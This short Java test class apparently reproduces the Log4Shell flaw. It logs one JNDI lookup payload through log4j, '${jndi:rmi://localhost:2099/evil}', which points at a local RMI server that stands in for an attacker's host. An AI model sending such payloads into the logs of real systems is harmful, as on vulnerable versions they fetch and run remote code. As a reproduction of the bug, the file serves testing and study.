/*
 * Copyright (c) 2001-2022 GuaHao.com Corporation Limited. All rights reserved.
 * This software is the confidential and proprietary information of GuaHao Company.
 * ("Confidential Information").
 * You shall not disclose such Confidential Information and shall use it only
 * in accordance with the terms of the license agreement you entered into with GuaHao.com.
 */
package com.bloom.log4j2bug;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * https://blog.csdn.net/Syjavascript/article/details/121876063
 *
 * @author taosy
 * @version V1.0
 * @since 2022-01-05 11:54
 */
public class Log4j2Test {
    private static final Logger logger = LogManager.getLogger(Log4j2Test.class);

    public static void main(String[] args) {
        String input = "${jndi:rmi://localhost:2099/evil}";
        logger.info("hello1 {}", input);

    }

}
